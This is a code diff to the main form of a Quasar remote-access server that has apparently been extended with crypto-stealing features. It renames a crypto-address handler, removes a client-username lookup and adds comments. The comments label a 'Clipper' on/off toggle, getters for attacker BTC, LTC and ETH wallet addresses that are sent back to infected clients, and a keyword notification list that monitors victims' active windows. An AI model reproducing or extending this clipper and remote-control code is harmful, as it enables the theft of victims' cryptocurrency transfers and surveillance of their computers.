@@ -36,7 +36,7 @@ namespace Quasar.Server.Forms
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
         private readonly ClientStatusHandler _clientStatusHandler;
-        private readonly GetCryptoAddress _getCryptoAddress;
+        private readonly GetCryptoAddressHandler _getCryptoAddressHander;
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object(); // lock for clients-listview
@@ -46,7 +46,7 @@ namespace Quasar.Server.Forms
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
-            _getCryptoAddress = new GetCryptoAddress();
+            _getCryptoAddressHander = new GetCryptoAddressHandler();
             RegisterMessageHandler();
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
@@ -72,8 +72,8 @@ namespace Quasar.Server.Forms
             _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
             //MessageHandler.Register(new GetPreviewImageHandler());
-            MessageHandler.Register(_getCryptoAddress);
-            _getCryptoAddress.AddressReceived += OnAddressReceived;
+            MessageHandler.Register(_getCryptoAddressHander);
+            _getCryptoAddressHander.AddressReceived += OnAddressReceived;
         }
 
         /// <summary>
@@ -85,8 +85,8 @@ namespace Quasar.Server.Forms
             _clientStatusHandler.StatusUpdated -= SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
-            MessageHandler.Unregister(_getCryptoAddress);
-            _getCryptoAddress.AddressReceived -= OnAddressReceived;
+            MessageHandler.Unregister(_getCryptoAddressHander);
+            _getCryptoAddressHander.AddressReceived -= OnAddressReceived;
         }
 
         public void UpdateWindowTitle()
@@ -1098,6 +1098,7 @@ namespace Quasar.Server.Forms
 
         }
 
+        // Add key words to the notification centre
         private void addKeywordsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             using (var frm = new FrmKeywords())
@@ -1124,19 +1125,6 @@ namespace Quasar.Server.Forms
             }
             item.SubItems[3].Text = WindowText;
             frmMain.lstNoti.Items.Add(item);
-        }
-
-        //Get Clients Username
-        public static string GetClientsUsername(string ipAddress, FrmMain frmMain)
-        {
-            foreach (ListViewItem item in frmMain.lstClients.Items)
-            {
-                if (item.Text.Trim() == ipAddress.Trim())
-                {
-                    return item.SubItems[2].Text;
-                }
-            }
-            return "Unknown";
         }
 
         private void clientsToolStripMenuItem_Click(object sender, EventArgs e)
@@ -1242,6 +1230,7 @@ namespace Quasar.Server.Forms
 
         }
 
+        // Stop or Start Clipper
         private void ClipperCheckbox_CheckedChanged(object sender, EventArgs e)
         {
             if (ClipperCheckbox.Checked == true)
@@ -1314,6 +1303,7 @@ namespace Quasar.Server.Forms
             }
         }
 
+        // Clipper Address to send back to client
         public string GetBTCAddress() => BTCTextBox.Text;
         public string GetLTCAddress() => LTCTextBox.Text;
         public string GetETHAddress() => ETHTextBox.Text;
@@ -1334,6 +1324,7 @@ namespace Quasar.Server.Forms
 
         }
 
+        //Saving logs of the event logger
         private void saveLogsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             using (SaveFileDialog saveFileDialog = new SaveFileDialog())
